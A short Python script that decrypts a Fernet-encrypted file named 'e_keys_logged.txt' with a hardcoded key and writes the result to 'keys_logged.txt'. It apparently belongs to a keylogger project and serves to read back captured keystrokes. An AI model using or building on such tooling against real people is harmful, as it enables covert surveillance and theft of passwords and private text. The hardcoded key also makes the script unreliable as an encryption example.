from cryptography.fernet import Fernet

key= "ggQYC8ACD9GP05qHFSHowtjcoW73nyiIx7Rv_tY0sdM="
keys_information_e="e_keys_logged.txt"
keys_information="keys_logged.txt"
file_path="your file path"
extend = "\\"
file_merge=file_path+extend

with open(file_merge+keys_information_e, 'rb') as f:
    data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

with open(file_merge+keys_information, 'wb') as f:
    f.write(decrypted)

